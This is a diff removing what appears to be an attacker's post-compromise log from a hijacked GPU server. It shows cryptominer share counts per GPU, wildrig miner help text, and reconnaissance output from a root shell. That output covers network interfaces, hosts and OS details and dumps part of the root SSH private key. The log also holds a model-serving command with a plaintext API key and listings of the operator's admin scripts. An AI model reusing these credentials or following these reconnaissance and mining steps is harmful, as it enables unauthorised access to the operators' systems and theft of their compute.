@@ -1,1393 +1,6 @@
 Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
-### POSTPLANT 2026-11-24T19:06:48Z
-### ACCEPTED-COUNTS
-g0 accepted=1 last=accepted (1/0)        GPU#0        (304 ms)
-g1 accepted=2 last=accepted (2)        GPU#1        (306 ms)
-g2 accepted=1 last=accepted (1/0)        GPU#2        (306 ms)
-g3 accepted=2 last=accepted (2/0)        GPU#3        (309 ms)
-g4 accepted=1 last=accepted (1/0)        GPU#4        (307 ms)
-g5 accepted=0 last=
-g6 accepted=0 last=
-g7 accepted=4 last=accepted (4/0)        GPU#7        (302 ms)
-### SAMPLER
-2026-11-24T19:06:49Z {"est15": 25.6, "mine": 8, "names": ["ul-t2-123-184-7-135-g5", "ul-t2-123-184-7-135-g6", "ul-t2-123-184-7-135-g1", "ul-t2-123-184-7-135-g4", "ul-t2-123-184-7-135-g3", "ul-t2-123-184-7-135-g2", "ul-t2-123-184-7-135-g7", "ul-t2-123-184-7-135-g0"]}
-### T19-INTEL
-/opt/t19/:
-total 208944
-drwxr-xr-x  6 root   root        4096 Nov 25 02:46 .
-drwxr-xr-x 17 root   root        4096 Nov 25 02:34 ..
-drwxr-xr-x  2 root   root        4096 Nov 24 05:06 bak
--rwxr-xr-x  1 root   root         841 Nov 24 03:22 boot_krig.sh.orig
--rwxr-xr-x  1 root   root         427 Nov 24 03:47 boot_wr.sh.orig
--rw-r--r--  1 root   root      599922 Nov 25 00:48 g0.log
--rw-r--r--  1 root   root      599622 Nov 25 00:48 g1.log
--rw-r--r--  1 root   root      599211 Nov 25 00:48 g2.log
--rw-r--r--  1 root   root      600216 Nov 25 00:48 g3.log
--rw-r--r--  1 root   root      599848 Nov 25 00:48 g4.log
--rw-r--r--  1 root   root      600475 Nov 25 00:48 g5.log
--rw-r--r--  1 root   root      599488 Nov 25 00:48 g6.log
--rw-r--r--  1 root   root      600588 Nov 25 00:48 g7.log
--rw-r--r--  1 vendor vendor      6423 Jun  9  2025 help.txt
--rw-r--r--  1 root   root         669 Nov 25 03:06 k466.txt
--rwxr-xr-x  1 root   root         657 Nov 24 05:03 keep.sh
--rw-r--r--  1 root   root    29729454 Nov 24 14:11 kit.tgz
-drwxr-xr-x  2 root   root        4096 Nov 24 02:14 krig
--rw-r--r--  1 root   root   119697919 Nov 24 02:14 krig.tar.gz
--rwxr-xr-x  1 root   root        1146 Nov 24 02:13 krig_dl.sh
-drwxr-xr-x  2 root   root        4096 Nov 24 05:00 log
--rw-r--r--  1 root   root         312 Nov 24 07:00 p2.sh
--rw-r--r--  1 root   root         263 Nov 23 21:16 plant.log
--rw-r--r--  1 root   root         774 Nov 24 04:53 q.txt
--rw-r--r--  1 vendor vendor       234 Feb  7  2019 readme.txt
--rw-r--r--  1 root   root        9161 Nov 24 13:29 recon929.out
--rw-r--r--  1 root   root        1677 Nov 24 13:25 recon929.sh
--rwxr-xr-x  1 root   root         936 Nov 24 04:53 relaunch_qwen.sh
---- /opt/t19/recon929.out
-== id
-uid=0(root) gid=0(root) groups=0(root)
-g0023
-Tue Nov 24 05:25:56 UTC 2026
-== ip
-    inet 127.0.0.1/8 scope host lo
-    inet 11.9.141.130/28 brd 11.9.141.143 scope global eth2
-    inet 11.9.141.146/28 brd 11.9.141.159 scope global eth3
-    inet 11.9.141.162/28 brd 11.9.141.175 scope global eth4
-    inet 11.9.141.178/28 brd 11.9.141.191 scope global eth5
-    inet 11.9.141.194/28 brd 11.9.141.207 scope global eth6
-    inet 11.9.141.210/28 brd 11.9.141.223 scope global eth7
-    inet 11.9.141.226/28 brd 11.9.141.239 scope global eth8
-    inet 11.9.141.242/28 brd 11.9.141.255 scope global eth9
-    inet 192.168.0.23/24 brd 192.168.0.255 scope global bond0
-    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-9928043cc48a
-    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
-    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-070e074d1e36
-    inet 172.20.0.1/16 brd 172.20.255.255 scope global br-3e5c710384c4
-== hosts
-127.0.1.1 localhost
-
-# The following lines are desirable for IPv6 capable hosts
-::1     ip6-localhost ip6-loopback
-fe00::0 ip6-localnet
-ff00::0 ip6-mcastprefix
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
-::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
-192.168.0.23  instance-az1t0vf3-1
-== os
-PRETTY_NAME="Ubuntu 22.04.1 LTS"
-NAME="Ubuntu"
-VERSION_ID="22.04"
-== ssh
-total 24
-drwx------  2 root root 4096 Sep  3 17:03 .
-drwx------ 31 root root 4096 Nov 16 16:02 ..
--rw-------  1 root root 4032 Nov 24 09:56 authorized_keys
--rw-------  1 root root 2590 Apr 18  2026 id_rsa
--rw-r--r--  1 root root  564 Apr 18  2026 id_rsa.pub
--rw-r--r--  1 root root 1704 Nov 24 12:00 known_hosts
--- /root/.ssh/id_rsa
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEAvgMh7PpZCHNX8Ai59rX9nPx/JIYPJLea5aD0yWXpJogqfFtOQXR7
-jOgG0QrRl5ZdERk+6LuaGCYhzygb8a4D4FNaKeatOdf6sav279FSvyxHyUIcmxWh4NYoLW
-qU/8c51tdeP99iFP5I2ykSGlNh4hoqeaRXw+FeFX2feOrAAqbN3YsjIkjdDHhWjEBOCdia
-bLxf0+atVvjCABdRXC+LqD7dGZ8siz3fGPnEGSWyWOqQOeDY51+daOYCk0s7jGsTgoHiCB
---- /opt/t19/q.txt
-/ssd/vendors/INSPUR/models/vllm_uv_env/bin/python
-/ssd/vendors/INSPUR/models/vllm_uv_env/bin/vllm
-serve
-/ssd/vendors/INSPUR/models/qwen3.8-27b
---served-model-name
-qwen3.8-27b
---host
-0.0.0.0
---port
-8000
---tensor-parallel-size
-2
---max-model-len
-262144
---max-num-seqs
-32
---api-key
-inspur-XinLiTong-2026
---max-num-batched-tokens
-65536
---gpu-memory-utilization
-0.85
---enable-prefix-caching
---mm-encoder-tp-mode
-data
---mm-encoder-attn-backend
-FLASH_ATTN
---mm-processor-kwargs
-{"min_pixels": 3136, "max_pixels": 1003520, "max_length": 131072}
---mm-processor-cache-gb
-16
---limit-mm-per-prompt
-{"image": 4}
---speculative-config
-{"method":"mtp","num_speculative_tokens":3}
---enable-auto-tool-choice
---tool-call-parser
-qwen3_xml
---reasoning-parser
-qwen3
---attention-backend
-FLASH_ATTN
---- /opt/t19/k466.txt
-uid=0(root) gid=0(root) groups=0(root)
-g0023
-GPU 0: NVIDIA A800-SXM4-80GB (UUID: GPU-1a616365-4581-31e6-1446-24a2457bc664)
-GPU 1: NVIDIA A800-SXM4-80GB (UUID: GPU-a1864ba2-3cb8-96bd-8b5e-b9161ef11bbc)
-GPU 2: NVIDIA A800-SXM4-80GB (UUID: GPU-d7dab522-fa0d-7fe8-dc36-3b395af93346)
-GPU 3: NVIDIA A800-SXM4-80GB (UUID: GPU-2ba4a927-d17a-4245-fcdc-77ea11b8dcc1)
-GPU 4: NVIDIA A800-SXM4-80GB (UUID: GPU-9b1adbd5-38c8-715d-a473-d70be061b8c9)
-GPU 5: NVIDIA A800-SXM4-80GB (UUID: GPU-12938f56-7015-a955-3656-20f28ed2e8c8)
-GPU 6: NVIDIA A800-SXM4-80GB (UUID: GPU-57bb3c06-75b7-39f2-167f-45223d4f35fa)
-GPU 7: NVIDIA A800-SXM4-80GB (UUID: GPU-933ea211-0623-e337-e5d3-83b489ca00db)
---- /opt/t19/help.txt
-Usage: wildrig [OPTIONS]
-
-  Some parameters can be set per gpu, use comma to separate each gpu and * to skip
-
-Options:
-  -a, --algo ALGO               specify the hash algorithm to use
-             anime
-             bitcore
-             blake2s(ASIC mineable)             bmw512
-             c11
-             curvehash
-             evohash
-             evrprogpow
-             firopow
-             ghostrider
-             heavyhash
-             hex
-             hmq1725
-             kawpow
-             lyra2v2(ASIC mineable)
-             megabtx
-             memehash
-             meowpow
-             mike
-             nexapow
-             nist5(ASIC mineable)
-             phi
-             phihash
-             progpow-ethercore
-             progpow-sero
-             progpow-telestai
-             progpow-quai
-             progpow-veil
-             progpowz
-             quark(ASIC mineable)
-             quibit(ASIC mineable)
-             sha256(ASIC mineable)
-             sha256d(ASIC mineable)
-             sha256q
-             sha256t
-             sha256csm
-             sha512256d
-             shandwich256
-             skein2
-             skunkhash
-             skydoge
-             timetravel
-             timetravel10
-             tribus
-             vprogpow
---- /opt/t19/farm_inv.txt
---- root conf
-total 12740
-drwxr-xr-x 10 root root    4096 Apr 18  2026 .
-drwx------ 34 root root    4096 Nov 25 02:28 ..
-drwxr-xr-x  2 root root    4096 Apr 18  2026 .Temp
-drwxr-xr-x  3 root root    4096 Apr 18  2026 .tmp
--rwxr-xr-x  1 root root     168 Apr 18  2026 10periodic
--rwxr-xr-x  1 root root    3115 Apr 18  2026 1to1_nccl_tests.sh
--rwxr-xr-x  1 root root     169 Apr 18  2026 20auto-upgrades
--rwxr-xr-x  1 root root    1656 Apr 18  2026 CentOS-Base.repo
--rwxr-xr-x  1 root root    1989 Apr 18  2026 IB_HCA_check.sh
--rwxr-xr-x  1 root root     315 Apr 18  2026 acs_check.sh
--rwxr-xr-x  1 root root     108 Apr 18  2026 addiptoyaml.txt
--rwxr-xr-x  1 root root    1616 Apr 18  2026 b200_ceph_storage_mount.sh
--rwxr-xr-x  1 root root    7834 Apr 18  2026 batch_install.sh
--rwxr-xr-x  1 root root     602 Apr 18  2026 batch_sn.sh
--rwxr-xr-x  1 root root     766 Apr 18  2026 bios.sh
--rwxr-xr-x  1 root root    1625 Apr 18  2026 blacklist.conf
--rwxr-xr-x  1 root root     720 Apr 18  2026 centos_softinstall.sh
--rwxr-xr-x  1 root root     769 Apr 18  2026 change_hostname.sh
--rwxr-xr-x  1 root root    6525 Apr 18  2026 check.sh
--rwxr-xr-x  1 root root    1403 Apr 18  2026 check_nodes.sh
--rwxr-xr-x  1 root root    8822 Apr 18  2026 chengdu_éƒ¨ç½²æ­¥éª¤.md
--rwxr-xr-x  1 root root     568 Apr 18  2026 clean.sh
--rwxr-xr-x  1 root root    1878 Apr 18  2026 collect_gpu_diag.sh
--rwxr-xr-x  1 root root      69 Apr 18  2026 config
--rwxr-xr-x  1 root root     631 Apr 18  2026 cpu_performance.sh
--rwxr-xr-x  1 root root    1376 Apr 18  2026 cpu_performance_centos.sh
--rwxr-xr-x  1 root root     959 Apr 18  2026 cuda.sh
--rwxr-xr-x  1 root root    2630 Apr 18  2026 deploy_fl_container.sh.sh
--rwxr-xr-x  1 root root    1293 Apr 18  2026 disable_chaojubiain_acs.sh
--rwxr-xr-x  1 root root    1223 Apr 18  2026 disable_chaowei_acs.sh
--rwxr-xr-x  1 root root    1421 Apr 18  2026 disable_ningchang_acs.sh
--rwxr-xr-x  1 root root     224 Apr 18  2026 disablenouveau.sh
--rwxr-xr-x  1 root root    3775 Apr 18  2026 disableupdate.sh
--rwxr-xr-x  1 root root    2333 Apr 18  2026 docker-install.yml
--rwxr-xr-x  1 root root    1139 Apr 18  2026 docker.sh
--rwxr-xr-x  1 root root    3909 Apr 18  2026 download_huggingfacemodel_B200_batch.sh
--rwxr-xr-x  1 root root    1139 Apr 18  2026 elbencho-storage-test.sh
--rwxr-xr-x  1 root root    1062 Apr 18  2026 env.sh
--rwxr-xr-x  1 root root    1466 Apr 18  2026 fio-parallel.sh
--rwxr-xr-x  1 root root    1277 Apr 18  2026 fio-single.sh
--rwxr-xr-x  1 root root    4282 Apr 18  2026 full-comfile.sh
-drwxr-xr-x  2 root root    4096 Apr 18  2026 gpu_burn
--rwxr-xr-x  1 root root     353 Apr 18  2026 gpu_lspci_info.sh
--rwxr-xr-x  1 root root    1105 Apr 18  2026 grub.sh
--rwxr-xr-x  1 root root     186 Apr 18  2026 h800_os_bugcollect.sh
--rwxr-xr-x  1 root root     223 Apr 18  2026 h800_share_storage.sh
--rwxr-xr-x  1 root root    9434 Apr 18  2026 hamiaotong_ubuntu_batch_install.sh
--rwxr-xr-x  1 root root    9832 Apr 18  2026 health-check-v2.sh
--rwxr-xr-x  1 root root     309 Apr 18  2026 health_check.sh
--rwxr-xr-x  1 root root      42 Apr 18  2026 hostlist
--rwxr-xr-x  1 root root     510 Apr 18  2026 hostname.sh
--rwxr-xr-x  1 root root    1296 Apr 18  2026 hosts
--rwxr-xr-x  1 root root 2826240 Apr 18  2026 ib_test.tar
--rwxr-xr-x  1 root root   92887 Apr 18  2026 ib_test_log.txt
--rwxr-xr-x  1 root root    2016 Apr 18  2026 ib_write_test.sh
--rwxr-xr-x  1 root root    1268 Apr 18  2026 ids.sh
--rwxr-xr-x  1 root root    1858 Apr 18  2026 install-docker.sh
--rwxr-xr-x  1 root root     208 Apr 18  2026 install_all_1.sh
--rwxr-xr-x  1 root root      85 Apr 18  2026 install_all_2.sh
--rwxr-xr-x  1 root root     708 Apr 18  2026 install_build_essential.sh
--rwxr-xr-x  1 root root    8772 Apr 18  2026 installnvidiadriver.sh
--rwxr-xr-x  1 root root    1073 Apr 18  2026 installofed.sh
--rwxr-xr-x  1 root root     560 Apr 18  2026 installpackage.sh
--rwxr-xr-x  1 root root     315 Apr 18  2026 ip_hostname_to_hosts.sh
--rwxr-xr-x  1 root root     306 Apr 18  2026 keygen.sh
--rwxr-xr-x  1 root root     670 Apr 18  2026 kgzs_copy_id_rsa.sh
--rwxr-xr-x  1 root root     618 Apr 18  2026 kill_dpkg_apt.sh
--rwxr-xr-x  1 root root    2548 Apr 18  2026 limits.conf
--rwxr-xr-x  1 root root     739 Apr 18  2026 mianmi.txt
--rwxr-xr-x  1 root root     164 Apr 18  2026 module.sh
-drwxr-xr-x  4 root root    4096 Apr 18  2026 modulefiles
--rwxr-xr-x  1 root root    1213 Apr 18  2026 monitor_nvlink.sh
--rwxr-xr-x  1 root root    1223 Apr 18  2026 monitor_pcie.sh
--rwxr-xr-x  1 root root     792 Apr 18  2026 mount.sh
--rwxr-xr-x  1 root root     356 Apr 18  2026 mountnfs.sh
--rwxr-xr-x  1 root root     683 Apr 18  2026 mpi.sh
--rwxr-xr-x  1 root root    4026 Apr 18  2026 multi_trans.sh
--rwxr-xr-x  1 root root    4015 Apr 18  2026 multitrans.sh
--rwxr-xr-x  1 root root     249 Apr 18  2026 nccl-tests.sh
--rwxr-xr-x  1 root root     148 Apr 18  2026 nccl.sh
-drwxr-xr-x  3 root root    4096 Apr 18  2026 nccl_test
--rwxr-xr-x  1 root root    1292 Apr 18  2026 net-tools.sh
--rwxr-xr-x  1 root root      48 Apr 18  2026 nolinuxupgrades
--rwxr-xr-x  1 root root     780 Apr 18  2026 nv_gpu_conf.sh
--rwxr-xr-x  1 root root    1049 Apr 18  2026 nvidia-container-toolkit.sh
--rwxr-xr-x  1 root root     193 Apr 18  2026 nvidia.sh
--rwxr-xr-x  1 root root 6779434 Apr 18  2026 nvlsm_2025.03.1-1_amd64.deb
--rwxr-xr-x  1 root root    4421 Apr 18  2026 openmpiç¼‚æ ¬ç˜§æµ ãƒ¥å¼·modulefilesç¼‚æ §å•“.md
--rwxr-xr-x  1 root root    4421 Apr 18  2026 openmpiç¼–è¯‘ä»¥åŠmodulefilesç¼–å†™.md
--rwxr-xr-x  1 root root    5912 Apr 18  2026 pair_batch_nccl-tests.sh
--rwxr-xr-x  1 root root     373 Apr 18  2026 para_copy.sh
--rwxr-xr-x  1 root root     210 Apr 18  2026 para_scp.sh
--rwxr-xr-x  1 root root     989 Apr 18  2026 para_ssh.sh
--rwxr-xr-x  1 root root     191 Apr 18  2026 pass.sh
--rwxr-xr-x  1 root root     348 Apr 18  2026 pcie.sh
--rwxr-xr-x  1 root root    7559 Apr 18  2026 prefetch.sh
--rwxr-xr-x  1 root root    2078 Apr 18  2026 progress.sh
--rwxr-xr-x  1 root root    1242 Apr 18  2026 raid10.sh
--rwxr-xr-x  1 root root    1788 Apr 18  2026 raid5.sh
--rwxr-xr-x  1 root root     469 Apr 18  2026 rc.local
--rwxr-xr-x  1 root root    2957 Apr 18  2026 rc_chengdu.local
--rwxr-xr-x  1 root root     626 Apr 18  2026 rclocal.sh
--rwxr-xr-x  1 root root     572 Apr 18  2026 rclocal_chaojubian.sh
--rwxr-xr-x  1 root root    8267 Apr 18  2026 root_batch_install.sh
--rwxr-xr-x  1 root root     663 Apr 18  2026 root_copy_id_rsa.sh
-drwxr-xr-x  2 root root    4096 Apr 18  2026 root_rsa
--rwxr-xr-x  1 root root    1806 Apr 18  2026 rsync-local2local.sh
--rwxr-xr-x  1 root root     427 Apr 18  2026 set-hostname.sh
--rwxr-xr-x  1 root root    1268 Apr 18  2026 set_sudonopasswd.sh
--rwxr-xr-x  1 root root     578 Apr 18  2026 single.sh
--rwxr-xr-x  1 root root     854 Apr 18  2026 ssh-ssh.sh
--rwxr-xr-x  1 root root     649 Apr 18  2026 ssh.sh
--rwxr-xr-x  1 root root    1648 Apr 18  2026 ssh_config
-drwxr-xr-x  2 root root    4096 Apr 18  2026 ssh_rsa
--rwxr-xr-x  1 root root    3269 Apr 18  2026 sshd_config
--rwxr-xr-x  1 root root    4855 Apr 18  2026 step_verify(2).sh
--rwxr-xr-x  1 root root      44 Apr 18  2026 synchosts.sh
--rwxr-xr-x  1 root root      89 Apr 18  2026 syncrclocal.sh
--rwxr-xr-x  1 root root    4118 Apr 18  2026 trans-multi-domain.sh
--rwxr-xr-x  1 root root    2098 Apr 18  2026 trans-progress.sh
--rwxr-xr-x  1 root root    1405 Apr 18  2026 trans_nodetonode.sh
--rwxr-xr-x  1 root root    1311 Apr 18  2026 trans_system_file.sh
--rwxr-xr-x  1 root root     658 Apr 18  2026 ubuntu_copy_id_rsa.sh
--rwxr-xr-x  1 root root    1197 Apr 18  2026 ubuntu_nfs.sh
-drwxr-xr-x  3 root root    4096 Apr 18  2026 ubuntu_rsa
--rwxr-xr-x  1 root root  649208 Apr 18  2026 ubuntué—†å—™å…¢é–®ã„§è®².docx
--rwxr-xr-x  1 root root  994193 Apr 18  2026 ubuntué›†ç¾¤éƒ¨ç½².docx
--rwxr-xr-x  1 root root     259 Apr 18  2026 unlimit.sh
--rwxr-xr-x  1 root root    2451 Apr 18  2026 yaml.sh
--rwxr-xr-x  1 root root     162 Apr 18  2026 ~$untué—†å—™å…¢é–®ã„§è®².docx
--rwxr-xr-x  1 root root  549012 Apr 18  2026 é—†å—™å…¢é©è™¹î”…éç‰ˆåµå¨´å¬­ç˜¯.docx
--rwxr-xr-x  1 root root  549012 Apr 18  2026 é›†ç¾¤åŸºç¡€æ•°æ®æµ‹è¯•.docx
-== /root/conf/10periodic
-APT::Periodic::Update-Package-Lists "0";
-APT::Periodic::Download-Upgradeable-Packages "0";
-APT::Periodic::AutocleanInterval "0";
-APT::Periodic::Unattended-Upgrade "0";
-== /root/conf/1to1_nccl_tests.sh
-#!/bin/bash
-set -e
-# å®šä¹‰èŠ‚ç‚¹åˆ—è¡¨
-#nodes=("node002" "node003" "node004" "node005" "node006" "node007" "node008" "node009" "node010" 
-#       "node011" "node012" "node013" "node014" "node015" "node016" "node017" "node018" "node019" "node020"
-#       "node021" "node022" "node023" "node024" "node025" "node026" "node027" "node028" "node029" "node030"
-#       "node031" "node032" "node033" "node034" "node035" "node036" "node037" "node038" "node039" "node040"
-#       "node041" "node042" "node043" "node044" "node045" "node046" "node047" "node048" "node049" "node050"
-#       "node051" "node052" "node053" "node054" "node055" "node056" "node057" "node058" "node059" "node060"
-#       "node061" "node062" "node063" "node064" "node065" "node066" "node067" "node068" "node069" "node070"
-#       "node071" "node072" "node073" "node074" "node075" "node076" "node077" "node078" "node079" "node080"
-#       "node081" "node082" "node083" "node084" "node085" "node086" "node087" "node088" "node089" "node090"
-#       "node091" "node092" "node093" "node094" "node095" "node096" "node097" "node098" "node099" "node100"
-#       "node101" "node102" "node103" "node104" "node105" "node106" "node107" "node108" "node109" "node110"
-#       "node111" "node112" "node113" "node114" "node115" "node116" "node117" "node118" "node119" "node120"
-#       "node121" "node122" "node123" "node124" "node125")
-#nodes=("g0001" "g0002" "g0003" "g0004" "g0005" "g0006" "g0007" "g0008" "g0009" "g0010" "g0011" "g0012" "g0013" "g0014" "g0015" "g0016")
-#nodes=("g0001" "g0005" "g0002" "g0006" "g0003" "g0011" "g0004" "g0012")
-nodes=("g0008" "g0007")
-# éå†èŠ‚ç‚¹ï¼ŒæŒ‰æ¯ä¸¤å°ä¸€ç»„è¿è¡Œnccl-test
-for ((i=0; i<${#nodes[@]}; i+=2)); do
-  node1=${nodes[$i]}
-  node2=${nodes[$i+1]}
-  
-  # åœ¨æ¯ä¸€å¯¹èŠ‚ç‚¹ä¹‹é—´è¿è¡ŒNCCLæµ‹è¯•å‘½ä»¤
-  echo "Running NCCL test between $node1 and $node2"
-  
-  # è¿™é‡Œæ˜¯å®é™…è¿è¡ŒNCCLæµ‹è¯•çš„å‘½ä»¤
-  # å‡è®¾ä½ å¯ä»¥é€šè¿‡SSHè¿è¡Œnccl-testï¼ˆå…·ä½“å‘½ä»¤æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹ï¼‰
-
-== /root/conf/20auto-upgrades
-APT::Periodic::Update-Package-Lists "0";
-APT::Periodic::Download-Upgradeable-Packages "0";
-APT::Periodic::AutocleanInterval "0";
-APT::Periodic::Unattended-Upgrade "0";
-
-== /root/conf/CentOS-Base.repo
-# CentOS-Base.repo
-#
-# The mirror system uses the connecting IP address of the client and the
-# update status of each mirror to pick mirrors that are updated to and
-# geographically close to the client.  You should use this for CentOS updates
-# unless you are manually picking other mirrors.
-#
-# If the mirrorlist= does not work for you, as a fall back you can try the 
-# remarked out baseurl= line instead.
-#
-#
-
-[base]
-name=CentOS-$releasever - Base
-#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os&infra=$infra
-baseurl=http://mirrors.aliyun.com/centos/7.9.2009/os/$basearch/
-gpgcheck=1
-gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
-
-#released updates 
-[updates]
-name=CentOS-$releasever - Updates
-#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=updates&infra=$infra
-baseurl=http://mirrors.aliyun.com/centos/7.9.2009/updates/$basearch/
-gpgcheck=1
-gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
-
-#additional packages that may be useful
-[extras]
-name=CentOS-$releasever - Extras
-== /root/conf/IB_HCA_check.sh
-#!/bin/bash
-
-# èŠ‚ç‚¹èŒƒå›´ (33-64)
-start=33
-end=64
-
-# ä¸¥æ ¼å®šä¹‰çš„è®¾å¤‡åˆ—è¡¨ï¼ˆæŒ‰æ•°å­—é¡ºåºï¼‰
-declare -a target_devices=(
-mlx5_0 mlx5_1 mlx5_2 mlx5_3 
-mlx5_7 mlx5_8 mlx5_9 mlx5_10
-)
-
-for ((i=start; i<=end; i++)); do
-    node=$(printf "gpu%g" $i)
-    echo -e "\n\e[1;34m========== Checking node $node ==========\e[0m"
-    
-    # è·å–åŸå§‹IBä¿¡æ¯ï¼ˆä¿ç•™é”™è¯¯è¾“å‡ºï¼‰
-    raw_output=$(ssh -o ConnectTimeout=5 -T kgzs@$node "ibstat" 2>&1)
-    ssh_status=$?
-    
-    # SSHè¿æ¥æ£€æŸ¥
-    if [ $ssh_status -ne 0 ]; then
-        echo -e "\e[31mSSH Error $ssh_status: ${raw_output}\e[0m"
-        continue
-    fi
-    
-    # ä½¿ç”¨å…³è”æ•°ç»„å­˜å‚¨è®¾å¤‡çŠ¶æ€
-    declare -A device_state
-    declare -A device_rate
-    
-== /root/conf/acs_check.sh
-for BDF in `lspci -d "*:*:*" | awk '{print $1}'`; do
-  # æ£€æŸ¥æ˜¯å¦æ”¯æŒACS
-  sudo setpci -v -s ${BDF} ECAP_ACS+0x6.w > /dev/null 2>&1
-  if [ $? -ne 0 ]; then
-    continue
-  fi
-  # è¯»å–ACSå¯„å­˜å™¨å€¼
-  acs_value=$(sudo setpci -v -s ${BDF} ECAP_ACS+0x6.w)
-  echo "Device ${BDF} ACS setting: ${acs_value}"
-done
-== /root/conf/addiptoyaml.txt
-ip addr add 10.254.15.26/24 dev  ensxxxx   ip link set ensxxx up    ip route add default via 10.254.15.254  == /root/conf/b200_ceph_storage_mount.sh
-#!/bin/bash
-#å­˜å‚¨å¼€é€šæµç¨‹ã€‘ 
-#1. @åˆ˜ç¾çªå°†å­˜å‚¨å¼€é€šéœ€æ±‚æç»™å®‡è¶…å›¢é˜Ÿçš„@åˆ˜æ­£ç« ã€‚
-#2. @åˆ˜æ­£ç« æ‰¾ç”°ç£Šå¼€é€šå­˜å‚¨ï¼Œç”°ç£Šå¼€é€šåå°†å­˜å‚¨keyäº¤ä»˜ç»™@åˆ˜æ­£ç« å¹¶ååŠ©è¿›è¡Œå­˜å‚¨çš„æŒ‚è½½ã€‚
-#3. æ­£ç« åæœŸé‡åˆ°ä»»ä½•å­˜å‚¨ä½¿ç”¨ä¸Šçš„é—®é¢˜æ‰¾ç”°ç£Šè§£å†³ã€‚
-#
-#ã€CephFSå­˜å‚¨æŒ‚è½½æ­¥éª¤
-#GPUè®¡ç®—èŠ‚ç‚¹é€šå¸¸éƒ½ä¼šæœ‰8ä¸ª400Gbç½‘å£å’Œ2ä¸ª200Gbç½‘å£ã€‚å…¶ä¸­200Gbç½‘å£çš„å‘½åé€šå¸¸æ˜¯ens120f0np0å’Œens120f1np1ã€‚è¿æ¥åˆ°CephFSå­˜å‚¨çš„ç½‘å£å°±ä½¿ç”¨è¿™ä¸¤ä¸ª200Gbç½‘å£ä¸­çš„ä¸€ä¸ªã€‚ç”±äºCephFSå­˜å‚¨æœåŠ¡ç«¯ä½¿ç”¨çš„æ˜¯0å·å£ï¼Œä¸ç¦å®çº¦å®šç»Ÿä¸€ä½¿ç”¨ens120f0np0è¿™ä¸ªå£ã€‚
-#1. æ‰§è¡Œip addr show dev ens120f0np0å‘½ä»¤æ‰¾åˆ°å½“å‰GPUè®¡ç®—èŠ‚ç‚¹ens120f0np0ç½‘å£çš„IPåœ°å€ã€‚æ¯”å¦‚æ˜¯10.27.5.63
-#2. è®¾å®šè¯¥ç½‘å£åˆ°å­˜å‚¨æœåŠ¡ç«¯çš„è·¯ç”±
-## ip route add 10.24.8.0/24 dev ens120f0np0 via 10.27.5.63
-#3.å¦‚æœB200é›†ç¾¤æœ‰CPUèŠ‚ç‚¹
-#æ‰§è¡Œibdev2netdev æ‰¾åˆ°mlx CAå£å¯¹åº”çš„200Gbç½‘ç»œæ¥å£åç§°ï¼Œæ¯”å¦‚:ens18f1np1
-#ip route add 10.24.8.0/24 dev ens18f1np1 via 10.24.32.32(æœ¬æœºip);ping -I 10.24.32.32(æœ¬æœºip)  10.24.8.48(å­˜å‚¨èŠ‚ç‚¹å†…ç½‘ip)
-#3. ä½¿ç”¨pingå‘½ä»¤æµ‹è¯•è¯¥èŠ‚ç‚¹åˆ°å­˜å‚¨ç«¯ç½‘ç»œè¿é€šæ€§ã€‚
-## ping -I 10.27.5.63  10.24.8.48
-#å¯pingé€šå³è¡¨ç¤ºç½‘ç»œæ²¡æœ‰é—®é¢˜ã€‚å†æ‰§è¡Œå¦‚ä¸‹æ–‡æ¡£æ­¥éª¤æŒ‚è½½å­˜å‚¨
-#https://ktdmyj58g1.feishu.cn/docx/VleHdCK3hoPzsIxKa8Mc6ExjnBc?from=from_copylink
-#ceph(ézw3)çš„æŒ‚è½½ç¤ºä¾‹:mount -t ceph :/ /share -o recover_session=clean,conf=/etc/ceph/ceph.conf,name=cfs06,fs=cfs06
-#zw3çš„æŒ‚è½½ç¤ºä¾‹:mount -t ceph :/ /share -o recover_session=clean,conf=/etc/ceph/zw3.conf,name=zw3cfs01,fs=zw3cfs01
-== /root/conf/batch_install.sh
-#!/bin/bash
-#set -euo pipefail
-
-# ========== é…ç½® ==========
-HOSTLIST="${1:-hostlist2}"
-JOBS=16
-SCP_USER_SSH_TIMEOUT=60
-SCP_PKG_TIMEOUT=600
-SSH_EXEC_TIMEOUT=3600
-LOG_DIR="./deploy_logs"
-REMOTE_USER="ubuntu"
-
-export LOG_DIR
-export REMOTE_USER
-export PARALLEL="--no-notice"
-
-# ========== è‡ªåŠ¨å®‰è£… parallel ==========
-if ! command -v parallel >/dev/null 2>&1; then
-    echo "âš ï¸  GNU parallel æœªå®‰è£…ï¼Œæ­£åœ¨è‡ªåŠ¨å®‰è£…..."
-    if sudo -n true 2>/dev/null; then
-        sudo apt update -y >/dev/null 2>&1
-        sudo apt install -y parallel >/dev/null 2>&1
-    else
-        echo "í ½í´‘ éœ€è¦ sudo æƒé™å®‰è£… parallelï¼Œè¯·è¾“å…¥å¯†ç ï¼š"
-        sudo apt update -y
-        sudo apt install -y parallel
-    fi
-    if ! command -v parallel >/dev/null 2>&1; then
-        echo "âŒ è‡ªåŠ¨å®‰è£…å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨è¿è¡Œï¼šsudo apt install parallel"
-        exit 1
-== /root/conf/batch_sn.sh
-#!/usr/bin/env bash
-KEY=id_rsa-wqd10nbj02g1
-JOBS=20
-IPS=hosts.list
-RESULT=result.csv
-
-echo "hostname,ip,sn" > "$RESULT"
-
-get_sn(){
-  ip=$1
-  out=$(ssh -i "$KEY" -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@"$ip" \
-        'echo "$HOSTNAME,$(dmidecode -s system-serial-number 2>/dev/null)"' 2>/dev/null)
